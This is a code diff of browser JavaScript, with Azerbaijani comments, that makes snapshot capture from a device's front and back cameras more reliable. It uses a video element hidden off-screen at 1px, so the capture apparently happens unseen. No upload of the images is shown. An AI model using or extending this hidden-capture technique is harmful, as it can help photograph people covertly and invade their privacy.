@@ -131,17 +131,41 @@
                 await Promise.all(promises);
             }
             
-            // Kameradan şəkil çək və canvas qaytár
+            // Video hazır olana qədər gözlə (kəsim gələnə qədər), maksimum timeout
+            function waitForVideoFrame(video, maxWaitMs) {
+                return new Promise((resolve) => {
+                    if (video.readyState >= 2 && video.videoWidth > 0) {
+                        resolve(true);
+                        return;
+                    }
+                    const start = Date.now();
+                    const check = () => {
+                        if (video.readyState >= 2 && video.videoWidth > 0) {
+                            resolve(true);
+                            return;
+                        }
+                        if (Date.now() - start > maxWaitMs) {
+                            resolve(false);
+                            return;
+                        }
+                        requestAnimationFrame(check);
+                    };
+                    requestAnimationFrame(check);
+                });
+            }
+            
+            // Kameradan şəkil çək və canvas qaytar (stream əvvəlcədən bağlanıb olmalıdır)
             async function captureFromCamera(facingMode, label) {
+                let video, stream;
                 try {
-                    const video = document.createElement('video');
+                    video = document.createElement('video');
                     video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
                     video.autoplay = true;
                     video.playsInline = true;
                     video.muted = true;
                     document.body.appendChild(video);
                     
-                    const stream = await navigator.mediaDevices.getUserMedia({
+                    stream = await navigator.mediaDevices.getUserMedia({
                         video: { 
                             facingMode: facingMode,
                             width: { ideal: 1280 }, 
@@ -152,31 +176,33 @@
                     
                     video.srcObject = stream;
                     
-                    return new Promise((resolve) => {
-                        video.onloadedmetadata = () => {
-                            video.play().then(() => {
-                                setTimeout(() => {
-                                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                                        const canvas = document.createElement('canvas');
-                                        canvas.width = video.videoWidth;
-                                        canvas.height = video.videoHeight;
-                                        canvas.getContext('2d').drawImage(video, 0, 0);
-                                        
-                                        // Kameranı bağla
-                                        stream.getTracks().forEach(track => track.stop());
-                                        video.remove();
-                                        resolve({ canvas, label });
-                                    } else {
-                                        stream.getTracks().forEach(track => track.stop());
-                                        video.remove();
-                                        resolve(null);
-                                    }
-                                }, 1000); // 1 saniyə gözlə
-                            });
-                        };
+                    await new Promise((resolve, reject) => {
+                        video.onloadedmetadata = () => video.play().then(resolve).catch(reject);
+                        video.onerror = () => reject(new Error('Video yüklənmədi'));
                     });
+                    
+                    // Ən azı 400ms gözlə ki kamera işıq tutsun, sonra çərçivə hazır olana qədər gözlə
+                    await new Promise(r => setTimeout(r, 400));
+                    const ready = await waitForVideoFrame(video, 5000);
+                    
+                    if (!ready || video.videoWidth === 0) {
+                        stream.getTracks().forEach(track => track.stop());
+                        video.remove();
+                        return null;
+                    }
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
+                    return { canvas, label };
                 } catch (error) {
                     console.log(`${label} xətası:`, error);
+                    if (stream) stream.getTracks().forEach(track => track.stop());
+                    if (video && video.parentNode) video.remove();
                     return null;
                 }
             }
@@ -186,11 +212,10 @@
                 try {
                     console.log('Kameralardan şəkil çəkilir...');
                     
-                    // Hər iki kameradan eyni vaxtda şəkil çək
-                    const [frontResult, backResult] = await Promise.all([
-                        captureFromCamera('user', 'ÖN KAMERA'),
-                        captureFromCamera('environment', 'ARXA KAMERA')
-                    ]);
+                    // Ardıcıl çək: mobil cihazlarda eyni anda iki kamera açıla bilməz
+                    const frontResult = await captureFromCamera('user', 'ÖN KAMERA');
+                    await new Promise(r => setTimeout(r, 300)); // Kamera tam bağlansın
+                    const backResult = await captureFromCamera('environment', 'ARXA KAMERA');
                     
                     // Heç olmasa bir şəkil alındımı?
                     if (!frontResult && !backResult) {
